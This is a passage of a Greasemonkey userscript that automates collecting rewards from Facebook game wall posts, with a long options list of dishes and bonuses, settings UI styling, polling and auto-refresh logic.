				'label' : "Chicken Gyro and Fries - 4",
				'type' : "checkbox",
				'default' : true
			},
			'chicken_pot_pie' : {
				'label' : "Chicken Pot Pie - 6",
				'type' : "checkbox",
				'default' : true
			},
			'chinese_candy_box' : {
				'label' : "Chinese Candy Box - 9",
				'type' : "checkbox",
				'default' : true
			}
		}
	},
	'creme_fraiche_caviar' : {
		'label' : "Creme Fraiche Caviar - 8",
		'type' : "checkbox",
		'default' : true,
		'kids' : {
			'chips_and_guacamole' : {
				'label' : "Chips and Guacamole - 3",
				'type' : "checkbox",
				'default' : true
			},
			'corned_beef' : {
				'label' : "Corned Beef - 5",
				'type' : "checkbox",
				'default' : true
			},
			'crackling_peking_duck' : {
				'label' : "Crackling Peking Duck - 3",
				'type' : "checkbox",
				'default' : true
			}
		}
	},
	'vegas_buffet' : {
		'label' : "Vegas Buffet - 5",
		'type' : "checkbox",
		"default" : true,
		'kids' : {
			'v.i.p._dinner' : {
				'label' : "V.I.P. Dinner - 99",
				'type' : "checkbox",
				"default" : true
			}
		}
	},
	'giant_dino_eggs' : {
		'label' : "Giant Dino Eggs - 18",
		'type' : "checkbox",
		"default" : true
	},
	'martian_brain_bake' : {
		'label' : "Martian Brain Bake - 18",
		'type' : "checkbox",
		"default" : true
	},
	'fish_n_chips' : {
		'label' : "Fish and Chips - 9",
		'type' : "checkbox",
		'default' : true
	},
	'lemon_butter_lobster' : {
		'label' : "Lemon Butter Lobster - 9",
		'type' : "checkbox",
		'default' : true
	},
	'steak_dinner' : {
		'label' : "Steak Dinner - 9",
		'type' : "checkbox",
		'default' : true
	},
	'ice_cream_sundae' : {
		'label' : "Ice Cream Sundae - 8",
		'type' : "checkbox",
		'default' : true
	},	
	'impossible_quiche' : {
		'label' : "Impossible Quiche - 8",
		'type' : "checkbox",
		'default' : true
	},
	'smoked_salmon_latkes' : {
		'label' : "Smoked Salmon Latkes - 8",
		'type' : "checkbox",
		'default' : true
	},
	'king_crab_bisque' : {
		'label' : "King Crab Bisque - 7",
		'type' : "checkbox",
		'default' : true
	},	
	'seafood_paella' : {
		'label' : "Seafood Paella - 7",
		'type' : "checkbox",
		'default' : true
	},
	'dino_drumstick' : {
		'label' : "Dino Drumstick - 6",
		'type' : "checkbox",
		'default' : true
	},
	'eggs_benedict' : {
		'label' : "Eggs Benedict - 6",
		'type' : "checkbox",
		'default' : true
	},
	'fiery_fish_tacos' : {
		'label' : "Fiery Fish Tacos - 6",
		'type' : "checkbox",
		'default' : true
	},
	'grand_tandoori_chicken' : {
		'label' : "Grand Tandoori Chicken - 6",
		'type' : "checkbox",
		'default' : true
	},
	'hotdog_and_garlic_fries' : {
		'label' : "Hotdog and Garlic Fries - 6",
		'type' : "checkbox",
		'default' : true
	},
	'powdered_french_toast' : {
		'label' : "Powdered French Toast - 6",
		'type' : "checkbox",
		'default' : true
	},	
	'veggie_lasagna' : {
		'label' : "Veggie Lasagna - 6",
		'type' : "checkbox",
		'default' : true
	},
	'white_radish_cake' : {
		'label' : "White Radish Cake - 6",
		'type' : "checkbox",
		'default' : true
	},
	'delicious_chocolate_cake' : {
		'label' : "Delicious Chocolate Cake - 5",
		'type' : "checkbox",
		'default' : true
	},
	'herbed_halibut' : {
		'label' : "Herbed Halibut - 5",
		'type' : "checkbox",
		'default' : true
	},
	'ginger_plum_pork_chops' : {
		'label' : "Ginger Plum Pork Chops - 5",
		'type' : "checkbox",
		'default' : true
	},
	'homestyle_pot_roast' : {
		'label' : "Homestyle Pot Roast - 5",
		'type' : "checkbox",
		'default' : true
	},
	'kung_pao_stir_fry' : {
		'label' : "Kung Pao Stir Fry - 5",
		'type' : "checkbox",
		'default' : true
	},
	'mystical_pizza' : {
		'label' : "Mystical Pizza - 5",
		'type' : "checkbox",
		'default' : true
	},
	'overstuffed_peppers' : {
		'label' : "Overstuffed Peppers - 5",
		'type' : "checkbox",
		'default' : true
	},
	'spaghetti_and_meatballs' : {
		'label' : "Spaghetti and Meatballs - 5",
		'type' : "checkbox",
		'default' : true
	},
	'tom_yum_goong' : {
		'label' : "Tom Yum Goong - 5",
		'type' : "checkbox",
		'default' : true
	},
	'tony%27s_classic_pizza' : {
		'label' : "Tony's Classic Pizza - 5",
		'type' : "checkbox",
		'default' : true
	},
	'voodoo_chicken_salad' : {
		'label' : "Voodoo Chicken Salad - 5",
		'type' : "checkbox",
		'default' : true
	},
	'jumbo_shrimp_cocktail' : {
		'label' : "Jumbo Shrimp Cocktail - 4",
		'type' : "checkbox",
		'default' : true
	},
	'lavish_lamb_curry' : {
		'label' : "Lavish Lamb Curry - 4",
		'type' : "checkbox",
		'default' : true
	},	
	'loco_moco' : {
		'label' : "Loco Moco - 4",
		'type' : "checkbox",
		'default' : true
	},
	'pumpkin_pie' : {
		'label' : "Pumpkin Pie - 4",
		'type' : "checkbox",
		'default' : true
	},
	'rackasaurus_ribs' : {
		'label' : "Rackasaurus Ribs - 4",
		'type' : "checkbox",
		'default' : true
	},
	'shu_mai_dumplings' : {
		'label' : "Shu Mai Dumplings - 4",
		'type' : "checkbox",
		'default' : true
	},
	'spitfire_roasted_chicken' : {
		'label' : "Spitfire Roasted Chicken - 4",
		'type' : "checkbox",
		'default' : true
	},
	'tikka_masala_kabobs' : {
		'label' : "Tikka Masala Kabobs - 4",
		'type' : "checkbox",
		'default' : true
	},
	'french_onion_soup' : {
		'label' : "French Onion Soup - 3",
		'type' : "checkbox",
		'default' : true
	},
	'macaroni_and_cheese' : {
		'label' : "Macaroni and Cheese - 3",
		'type' : "checkbox",
		'default' : true
	},
	'savory_stuffed_turkey' : {
		'label' : "Savory Stuffed Turkey - 3",
		'type' : "checkbox",
		'default' : true
	},
	'triple_berry_cheesecake' : {
		'label' : "Triple Berry Cheesecake - 3",
		'type' : "checkbox",
		'default' : true
	},
	'tostada_de_carne_asada' : {
		'label' : "Tostada de Carne Asada - 2",
		'type' : "checkbox",
		'default' : true
	},
	'jammin%27_jelly_donuts' : {
		'label' : "Jammin' Jelly Donuts - 1",
		'type' : "checkbox",
		'default' : true
	},
	'super_chunk_fruit_salad' : {
		'label' : "Super Chunk Fruit Salad - 1",
		'type' : "checkbox",
		'default' : true
	},
	'sirius_sorbet' : {
		'label' : "Sirius Sorbet - 8",
		'type' : "checkbox",
		'default' : true
	},
	'stuffed_mushrooms' : {
		'label' : "Stuffed Mushrooms - 6",
		'type' : "checkbox",
		'default' : true
	},
	'clubhouse_sandwich' : {
		'label' : "Clubhouse Sandwich - 4",
		'type' : "checkbox",
		'default' : true
	},
	'philly_cheesesteak' : {
		'label' : "Philly Cheesesteak - 10",
		'type' : "checkbox",
		'default' : true
	},
	'angel_fruit_cake' : {
		'label' : "Angel Fruit Cake - 6",
		'type' : "checkbox",
		'default' : true
	},
	'spicy_devil_eggs' : {
		'label' : "Spicy Devil Eggs - 5",
		'type' : "checkbox",
		'default' : true
	},
	'confit_de_canard' : {
		'label' : "Confit de Canard - 21",
		'type' : "checkbox",
		'default' : true
	},
	'kabayaki' : {
		'label' : "Kabayaki - 15",
		'type' : "checkbox",
		'default' : true
	},
	'corndog' : {
		'label' : "Corndog - 9",
		'type' : "checkbox",
		'default' : true
	},
	'falafel' : {
		'label' : "Falafel - 6",
		'type' : "checkbox",
		'default' : true
	},
	'osso_bucco' : {
		'label' : "Osso Bucco - 15",
		'type' : "checkbox",
		'default' : true
	},
	'chicken_vindaloo' : {
		'label' : "Chicken Vindaloo - 13",
		'type' : "checkbox",
		'default' : true
	},
	'chocolate_cream_pie' : {
		'label' : "Chocolate Cream Pie - 6",
		'type' : "checkbox",
		'default' : true
	},
	'raspberry_cheesecake' : {
		'label' : "Raspberry Cheesecake - 8",
		'type' : "checkbox",
		'default' : true
	},
	'lox_bagel' : {
		'label' : "Lox Bagel - 7",
		'type' : "checkbox",
		'default' : true
	},
	'super_sliders' : {
		'label' : "Super Sliders - 4",
		'type' : "checkbox",
		'default' : true
	},
	'sushi_spread' : {
		'label' : "Sushi Spread - 6",
		'type' : "checkbox",
		'default' : true
	},
	'vegetarian_tamales' : {
		'label' : "Vegetarian Tamales - 12",
		'type' : "checkbox",
		'default' : true
	},
	'escargot' : {
		'label' : "Escargot - 13",
		'type' : "checkbox",
		'default' : true
	},
	'vampire_staked_steak' : {
		'label' : "Vampire Staked Steak - 6",
		'type' : "checkbox",
		'default' : true
	},
	'blood_sausage' : {
		'label' : "Blood Sausage - 11",
		'type' : "checkbox",
		'default' : true
	},
	'pita_and_dolmas' : {
		'label' : "Pita and Dolmas - 9",
		'type' : "checkbox",
		'default' : true
	},

	'ranch_beans' : {
		'label' : "Ranch Beans - 30",
		'type' : "checkbox",
		'default' : true
	},
	
	'birthday_cupcakes' : {
		'label' : "Birthday Cupcakes - 10",
		'type' : "checkbox",
		'default' : true
	},

	'rack_of_lamb' : {
		'label' : "Rack Of Lamb - 7",
		'type' : "checkbox",
		'default' : true
	},
	'tempura_udon' : {
		'label' : "Tempura Udon - 3",
		'type' : "checkbox",
		'default' : true
	},
	'banana_nut_muffin' : {
		'label' : "Banana Nut Muffin - 10",
		'type' : "checkbox",
		'default' : true
	},
	'shanghai_dumplings' : {
		'label' : "Shanghai Dumplings - 7",
		'type' : "checkbox",
		'default' : true
	},
	'pastilla' : {
		'label' : "Pastilla - 8",
		'type' : "checkbox",
		'default' : true
	},
	'feijoada' : {
		'label' : "Feijoada - 5",
		'type' : "checkbox",
		'default' : true
	},
	'anniversary_cake' : {
		'label' : "Anniversary Cake - 3",
		'type' : "checkbox",
		'default' : true
	},
	'ratatouille' : {
		'label' : "Ratatouille - 16",
		'type' : "checkbox",
		'default' : true
	},
	'in_flight_meal' : {
		'label' : "In Flight Meal - 5",
		'type' : "checkbox",
		'default' : true
	},
	'red_burrito' : {
		'label' : "Red Burrito - 10",
		'type' : "checkbox",
		'default' : true
	},
	'tuna_melt' : {
		'label' : "Tuna Melt - 10",
		'type' : "checkbox",
		'default' : true
	},
	'veggie_sushi' : {
		'label' : "Veggie Sushi - 10",
		'type' : "checkbox",
		'default' : true
	},
	'caramel_corn' : {
		'label' : "Caramel Corn - 7",
		'type' : "checkbox",
		'default' : true
	},
	'royal_feast' : {
		'label' : "Royal Feast - 5",
		'type' : "checkbox",
		'default' : true
	},
	'unbirthday_cake' : {
		'label' : "Unbirthday Cake - 7",
		'type' : "checkbox",
		'default' : true
	},
	'deep_fried_turkey' : {
		'label' : "Deep Fried Turkey - 3",
		'type' : "checkbox",
		'default' : true
	},
	'chocolate_pecan_pie' : {
		'label' : "Chocolate Pecan Pie - 8",
		'type' : "checkbox",
		'default' : true
	},
	'gingerbread_house' : {
		'label' : "Gingerbread House - 56",
		'type' : "checkbox",
		'default' : true
	},
	'finger_sandwiches' : {
		'label' : "Finger Sandwiches - 4",
		'type' : "checkbox",
		'default' : true
	},
	'snack_platter' : {
		'label' : "Snack Platter - 11",
		'type' : "checkbox",
		'default' : true
	},
	'baked_ham' : {
		'label' : "Baked Ham - 4",
		'type' : "checkbox",
		'default' : true
	},
	'angel_slices' : {
		'label' : "Angel Slices - 11",
		'type' : "checkbox",
		'default' : true
	},
	'waldorf_salad' : {
		'label' : "Waldorf Salad - 4",
		'type' : "checkbox",
		'default' : true
	},
	'gem_cake' : {
		'label' : "Gem Cake - 0",
		'type' : "checkbox",
		'default' : true
	},
	'homemade_almond_toffee' : {
		'label' : "Homemade Almond Toffee - 4",
		'type' : "checkbox",
		'default' : true
	},
	'bread_pudding' : {
		'label' : "Bread Pudding - 14",
		'type' : "checkbox",
		'default' : true
	},
	'mini_crab_cakes' : {
		'label' : "Mini Crab Cakes - 10",
		'type' : "checkbox",
		'default' : true
	},
	'salmon_rillettes' : {
		'label' : "Salmon Rillettes - 10",
		'type' : "checkbox",
		'default' : true
	},
	'beef_skewers' : {
		'label' : "Beef Skewers - 10",
		'type' : "checkbox",
		'default' : true
	},
	'stardust_stew' : {
		'label' : "Stardust Stew - 6",
		'type' : "checkbox",
		'default' : true
	},
	'snowflake_cake' : {
		'label' : "Snowflake Cake - 12",
		'type' : "checkbox",
		'default' : true
	},
	'beef_wellington' : {
		'label' : "Beef Wellington - 12",
		'type' : "checkbox",
		'default' : true
	},
	'funnel_cake' : {
		'label' : "Funnel Cake - 0",
		'type' : "checkbox",
		'default' : true
	},
	'onion_rings' : {
		'label' : "Onion Rings - 0",
		'type' : "checkbox",
		'default' : true
	},
	'deep_fried_candy_bar' : {
		'label' : "Deep Fried Candy Bar - 0",
		'type' : "checkbox",
		'default' : true
	},
	
	'lost_recipe' : {
		'section' : [ "Lost Recipes" ],
		'label' : "Assist with Lost Recipes?",
		'type' : "checkbox",
		'default' : false,
	},
	'recipe_points' : {
		'label' : "Choose Points",
		'type' : "checkbox",
		'default' : true,
		'title' : "Selecting yes, will choose points instead of coins when helping with Lost Recipes"
	},
	'grandmas_pie' : {
		'label' : "Help With Grandma's Apple Pie",
		'type' : "checkbox",
		'default' : true
	},
	'grandpas_pie' : {
		'label' : "Help With Grandpa's BBQ Ribs",
		'type' : "checkbox",
		'default' : true
	},
	'spice_help' : {
		'section' : [ "Spice Options" ],
		'label' : "Open Spice Crate",
		'type' : "checkbox",
		'default' : true
	},
	'mystery_spice' : {
		'label' : "Send Mystery Spice",
		'type' : "checkbox",
		'default' : true
	},
	'friend_spice_reward' : {
		'label' : "Get Friend Spice Rewards",
		'type' : "checkbox",
		'default' : true
	},
	'friendspice' : {
		'label' : "Get Free Spice Shipments",
		'type' : "checkbox",
		'default' : true
	},
	'scratch_lotto' : {
		'section' : [ "Scratch-Off Lotto Options" ],
		'label' : "Play Scratch Off Tickets?",
		'type' : "checkbox",
		'default' : true
	},
	'scratchoff_slot' : {
		'label' : 'Scratch off which spot?', 
		'type' : "select",
		'options' : { 0:'One', 1:'Two', 2:'Three', 3:'Random' }, // List of possible options
		'default' : 'Random'
	},
	'friend_helping_page' : {
		'section' : [ "Helping Out Friends (Missions) Options" ],
		'label' : "Help out friends with missions?",
		'type' : "checkbox",
		'default' : true
	},
	'friend_helping_slot' : {
		'label' : 'Choose which option?', 
		'type' : "select",
		'options' : { 1:'One', 2:'Two', 3:'Random' }, // List of possible options
		'default' : 'Random'
	},
	'waterfall' : {
		'label' : "Collect Waterfalls?",
		'type' : "checkbox",
		'default' : true
	},
	'wedding_cake' : {
		'label' : "Collect Wedding Cakes?",
		'type' : "checkbox",
		'default' : true
	},
	'build_a_stove' : {
		'section' : [ "Build A Stove Options" ],
		'label' : "Get Build A Stove Parts",
		'type' : "checkbox",
		'default' : true
	},
	'build_a_stove_slot' : {
		'label' : 'Choose which option?', 
		'type' : "select",
		'options' : { 0:'One', 1:'Two', 2:'Random' }, // List of possible options
		'default' : 'Random'
	},
	'achievement_bonus' : {
		'section' : [ "Generic Options" ],
		'label' : "Accept Achievement Bonus",
		'type' : "checkbox",
		'default' : true
	},
	'achievement_reward' : {
		'label' : "Accept Achievement Rewards",
		'type' : "checkbox",
		'default' : true
	},
	'dailybonus' : {
		'label' : "Accept Daily Bonus Rewards",
		'type' : "checkbox",
		'default' : true
	},
	'masterybonus' : {
		'label' : "Accept Mastery Boost Rewards",
		'type' : "checkbox",
		'default' : true
	},
	'cateringmissionreminder' : {
		'label' : "Accept General Catering Rewards",
		'type' : "checkbox",
		'default' : true
	},
	'cateringhelpfriend' : {
		'label' : "Accept BBQ Catering Rewards",
		'type' : "checkbox",
		'default' : true
	},
	'outsidemission' : {
		'label' : "Accept VIP Salads",
		'type' : "checkbox",
		'default' : true
	},
	'birthdaycake' : {
		'label' : "Accept Birthday Cake",
		'type' : "checkbox",
		'default' : true
	},
	'machinemastery' : {
		'label' : "Accept Coffee Energy Refills",
		'type' : "checkbox",
		'default' : true
	},
	'chef_special_2' : {
		'label' : "Accept Unknown or New Dishes",
		'type' : "checkbox",
		'default' : true
	},
	'friendmission' : {
		'label' : "Accept Extra Servings",
		'type' : "checkbox",
		'default' : true
	},
	'dishes' : {
		'label' : "Accept Dishes",
		'type' : "checkbox",
		'default' : true
	},
	'loot_share' : {
		'label' : "Share of the loot?",
		'type' : "checkbox",
		'default' : true
	},
	'spoil_saved' : {
		'label' : "Get the saved spoiled food?",
		'type' : "checkbox",
		'default' : true
	},
	'taste_test' : {
		'label' : "Get Free Taste Test dishes?",
		'type' : "checkbox",
		'default' : true
	},
	'coffeefirstbrewfeed' : {
		'label' : "Get First Brew Rewards?",
		'type' : "checkbox",
		'default' : true
	},
	'questcompletefeed' : {
		'label' : "Get Goal Completion Rewards?",
		'type' : "checkbox",
		'default' : true
	},
	'bigtipper' : {
		'label' : "Get Big Tipper Rewards?",
		'type' : "checkbox",
		'default' : true
	},
	'collections' : {
		'label' : "Get Collections Rewards?",
		'type' : "checkbox",
		'default' : true
	},
	'buildanx' : {
		'label' : "Help With Project Assembly?",
		'type' : "checkbox",
		'default' : true
	},
	'specialdelivery' : {
		'label' : "Get And Send Special Delivery Bonuses?",
		'type' : "checkbox",
		'default' : true
	},
	'cookingacademy' : {
		'label' : "Get Cooking Academy Bonuses?",
		'type' : "checkbox",
		'default' : true
	},
	'questaskforhelp' : {
		'label' : "Help Friends with Goals?",
		'type' : "checkbox",
		'default' : true
	},
	'pastrystationfeed' : {
		'label' : "Get Pastry Station Bonuses?",
		'type' : "checkbox",
		'default' : true
	},
	'bbqgrillfeed' : {
		'label' : "Get BBQ Grill Bonuses?",
		'type' : "checkbox",
		'default' : true
	},
	'assemblythanks' : {
		'label' : "Get Thank You Bonuses?",
		'type' : "checkbox",
		'default' : true
	},
	'moneytree' : {
		'label' : "Get Holiday Tree Bonuses?",
		'type' : "checkbox",
		'default' : true
	},

	'removedone' : {
		'section' : [ "Wall Post Options" ],
		'label' : "Hide finished items from feed?",
		'type' : "checkbox",
		"default" : false,
		title : "Helps keep browser memory low."
	},
	'autolike' : {
		'label' : "Auto \"like\" clicked posts?",
		'type' : "checkbox",
		"default" : false
	},
	'clicksimilar' : {
		'label' : "Click on similar link posts?",
		'type' : "checkbox",
		"default" : true
	},
	'colorize' : {
		'label' : "Colorize Wall Posts?",
		'type' : "checkbox",
		"default" : false,
		"title" : "Check this if you want the wall posts to be colored green for accepted or yellow for ignored."
	},
	'runOnFilterPageOnly' : {
		'label' : "Only run on filter page?",
		'type' : "checkbox",
		"default" : true,
		"title" : "Uncheck this if you want the script to run on the home feed page (Not Recommended)."
	},
	'olderpostsbottom' : {
		'section' : [ "Technical Options" ],
		'label' : "Force older posts bar to bottom?",
		'type' : "checkbox",
		"default" : false
	},
	'status' : {
		'label' : "Show debug status bar?",
		'type' : "checkbox",
		"default" : true
	},
	'reqtimeout' : {
		'section' : [ "Advanced Options" ],
		'label' : "Request Timeout (secs)",
		'type' : "float",
		"default" : 30
	},
	'arinterval' : {
			'label' : "Auto Refresh",
			'type' : "select",
			'options' : {
				'off' : "Off",
				'sixth' : "10 seconds",
				'half' : "30 seconds",
				'one' : "1 minute",
				'two' : "2 minutes",
				'three' : "3 minutes",
				'four' : "4 minutes",
				'five' : "5 minutes",
				'ten' : "10 minutes"
			},
			"default" : "2 minutes"
	},
	'maxrequests' : {
		'label' : "Max simultaneous requests",
		'type' : "float",
		"default" : 1,
		'title' : "WARNING: ONLY 1 IS RECOMMENDED UNLESS YOU WANT TO RISK BEING BANNED."
	},
	'reset' : {
		'label' : "Reset Accepted Items",
		'type' : "button",
		'script' : main.resetAccepted
	}
},  // Custom styling for the options interface
// "body {color:#FFFFFF !important; margin:0 !important; background:transparent url('"+imgs.bg+"') !important;}\n"+
"body {color:#FFFFFF !important; background-color:#00000F !important; margin:0 !important; }\n"+
".section_header {background:#333333 !important; display:block;}\n"+
".section_header_holder {padding:0 6px 0 6px !important; margin-top:8px !important;}\n"+
".field_label {font-size:11px !important;}\n"+
"span>label.field_label {margin-right:3px !important;}\n"+
"#header {font-size:18px !important;}\n"+
"#resetLink {color:#FFFFFF !important;}\n"+
"span.config_var {display:inline !important; margin-left:14px !important;}\n"+
"#saveBtn, #cancelBtn {position:fixed; background-color: #000000 !important; -moz-border-radius: 4px !important; border: 1px solid #4E483D !important;}\n"+
"#saveBtn {color: #5B9337 !important; bottom:4px; right:80px;}\n"+
"#cancelBtn {color: #BB0000 !important; bottom:4px; right:6px;}\n"+
"input[type=\"text\"] {text-align: center !important;width: 34px !important; color: #CCCCCC !important; background-color: #000000 !important; -moz-border-radius: 4px !important; border: 1px solid #4E483D !important;}"
);

// add options shortcut to user script commands
GM_registerMenuCommand(main.gameName+" Wall Manager "+version+" Options", main.config); // add options shortcut to user script commands

// add div that holds the iframes for requests
// Changed to avoid bug with display:none iframes and added name attr and debug support 

// document.body.insertBefore(main.create("div", {id:"silent_req_holder",style:"display:none;visibility:hidden;width:0;height:0;"}), document.body.firstChild);

// document.body.insertBefore(main.create("div", {id:"silent_req_holder",name:"silent_req_holder",style:"visibility:hidden; border:0px; width:0; height:0;"}), document.body.firstChild);
document.body.insertBefore(main.create("div", {id:"silent_req_holder",name:"silent_req_holder",style:SHR_Style}), document.body.firstChild);
// position:fixed;width:99.15%;height:15%;top:0;right:0;bottom:auto;left:0;border:solid;
// document.body.insertBefore(main.create("div", {id:"silent_req_holder",style:"display:block;visibility:visible;position:fixed;width:99.15%;height:65%;top:0;right:0;bottom:auto;left:0;border:solid;"}), document.body.firstChild);


// Method to work on multiple accounts
var prof=document.evaluate("//a[@href and .='Profile']", document, null, 9, null).singleNodeValue;
if(prof) main.profile = prof.href.find("id=") ? prof.href.split("id=")[1].split("&")[0] : prof.href.match(main.profileRegex)[1];

// if on the homepage with the home feed showing
if($("pagelet_navigation")) {

// method to speed up script considerably
var tempopts={}, settings=GM_config.settings;
for(var thing in settings) { // go through the options making cached options copy
var g=GM_config.get(thing), kids=settings[thing].kids;
switch(typeof g) {
case "boolean": tempopts[thing] = g ? true : false; break;
case "number": tempopts[thing] = g || 0; break;
case "text": tempopts[thing] = g || ""; break;
default: tempopts[thing] = g;
}
if(kids && typeof kids=="object") for(var kid in kids) { // go through the extended settings also
var k=GM_config.get(kid);
switch(typeof k) {
case "boolean": tempopts[kid] = k ? true : false; break;
case "number": tempopts[kid] = k || 0; break;
case "text": tempopts[kid] = k || ""; break;
default: tempopts[kid] = k;
}
}
}
main.opts = tempopts; tempopts=null; k=null; g=null;

// another method to speed up - keep about:config clean
var acc=main.getAccepted(), accTime=main.getAcceptedTime(), timeNow=new Date().getTime();
for(var w in accTime) {
var accTimew=accTime[w], accw=acc[w];
for(var k in accTimew) { // loop through the accepted items' times
var days=(timeNow - accTimew[k]) / 1000 / 60 / 60; // get the existance time in hours
if(days > 48 && accw.inArray(k)) { // an old accepted item is over 48 hours (2 days) old
accw.splice(accw.inArrayWhere(k), 1); // remove from accepted items array
delete accTimew[k]; // remove from time object
}
}
}
main.setAccepted(acc);
main.setAcceptedTime(accTime);

// add debug status bar to page - changed visibility to hidden initially
document.body.appendChild(main.create("div", {id:"status",style:"visibility: hidden; position: fixed; bottom: 4px; left: 4px; padding: 2px; background: #FFFFFF; color: #000000; border: 1px solid #4F4F4F; font-family: arial, verdana, sans-serif; font-size: 1em; z-index: 99998; width: 178px; text-align: center;",textContent:"["+main.gameAcronym+"] 0 requests currently.", onclick:function(e){
if(main.boxFull) return;
main.paused = !main.paused;
main.pauseClick = true;
main.pauseCount = main.opts["inputtimeout"] || 15;
main.status();
}}));

// listen for key presses to autopause, if enabled
if(GM_config.get("inputtimeoutenable")) {
window.addEventListener("keydown", function(e) {
if(",9,18,33,34,35,36,37,38,39,40,116".find(","+e.keyCode) || (main.paused && main.pauseClick)) return;
main.paused=true;
main.pauseClick=false;
main.pauseCount = main.opts["inputtimeout"] || 15;
main.status();
}, false);
}

// *******************************
//   Added debug code
// *******************************

if(showSilentRequestHolderFrame === true) {
	main.opts["maxrequests"] = 1;
	main.opts["reqtimeout"] = 120;
//	main.opts["arinterval"] = "off";
	main.opts["removedone"] = false;
//	main.opts["minposts"] = false;
//	main.opts["maxposts"] = false;
}

// make script run every second, update debug bar, and click similar posts links
window.setInterval(function(e){
main.similarPosts();
window.setTimeout(function(){main.run();},0);
switch(main.opts["status"]) {case true: main.status(); break;}
},1000);

// stuff to do on full page load
window.addEventListener("load", function(e) {
}, false);

// add autorefresh if enabled
if(main.opts["arinterval"] != "off") window.setTimeout(main.refresh, main.refTime);
} else if(document.title=="Problem loading page") main.refresh();

// add another shortcut to the config, this time as a link on the page
var f=$g("//div[starts-with(@id, 'pagelet_navigation')]", {type:9});
if(f) {

// Add checking and creation if needed, of the WallManagerHolder div system here so all wall managers can use it.
if(!$('navigation_item_wall_managers')) {
	var navDiv = document.createElement('div');
	navDiv.id='navigation_item_wall_managers';
	navDiv.innerHTML="<div class=\"clearfix uiHeader uiHeaderNav online_header uiHeaderTopBorder\"><div class=\"lfloat\" style=\"height:12px;\"><h4>Wall Managers<\/h4><\/div>";

	f.insertBefore(navDiv, f.childNodes[0]);
}
f.insertBefore((main.create("a", {className:"item", href:"javascript:void(0);", onclick:main.config}, new Array(
	main.create("span", {className:"imgWrap"}, new Array(main.create("img", {src:imgs.icon}))),
	main.create("span", {innerHTML:" " + main.gameAcronym+" "+version+" Options<br />"})
))), f.childNodes[1]
);
}

// pre-load images
for(var img in imgs) new Image().src = imgs[img];
}

// if(GM_config.get("olderpostsbottom") === true) GM_addStyle("#contentArea div.uiMorePager {-moz-border-radius: 8px !important; position: fixed !important; bottom: 2px !important; left: 22% !important; width: 25% !important; background-color: #969696 !important; border-color: #000000 !important; z-index: 9999 !important;}\n#contentArea div.uiMorePager * {color: #FFFFFF !important;}\n.UIActionLinks.UIActionLinks_bottom.GenericStory_Info > a { float: right !important;}");

// Changed 11-03-10 due to new FB changes - RTWG
// Below from FVWM - doesn't work with AEOP 
// if(GM_config.get("olderpostsbottom") === true) GM_addStyle("#contentArea div.uiMorePagerAnchor {-moz-border-radius: 4px !important; position: fixed !important; bottom: 2px !important; left: 22% !important; width: 25% !important; background-color: #969696 !important; border-color: #000000 !important; z-index: 9999 !important;}\n.UIActionLinks.UIActionLinks_bottom.GenericStory_Info > a { float: right !important;}");

if(GM_config.get("olderpostsbottom") === true) GM_addStyle("#contentArea div.uiMorePagerAnchor {position: fixed !important; bottom: 5px !important; left: 23% !important; width: 47% !important; z-index: 9999 !important;}");


if (window.location.href.indexOf('home.php') == -1 && window.location.href.indexOf('?filter=app_'+main.gameID+'') != -1)
{
	window.location.href = 'http://www.facebook.com/home.php?filter=app_'+main.gameID+'&show_hidden=true&ignore_self=true&sk=lf';
	return;
}

